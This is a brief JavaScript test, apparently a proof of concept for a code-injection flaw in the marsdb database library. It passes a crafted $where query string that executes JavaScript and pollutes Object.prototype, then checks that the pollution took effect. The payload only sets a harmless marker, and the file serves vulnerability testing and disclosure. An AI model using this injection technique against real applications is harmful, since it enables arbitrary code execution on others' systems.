//
test("Arbitrary code execution in marsdb", () => {
  let Collection = require("marsdb").Collection;
  expect({}.polluted).toBe(undefined);

  const posts = new Collection("posts", { inMemory: true });
  try {
    let val = posts.insert({ text: "MarsDB is awesome" });
    val.then((docId) => {
      let out = posts.find({ $where: "(Object.prototype.polluted=`yes`)" });
      out.then((docs) => {
        //console.log(`dsf`)
        expect({}.polluted).toBe("yes");
      });
    });
  } catch (e) {}
});
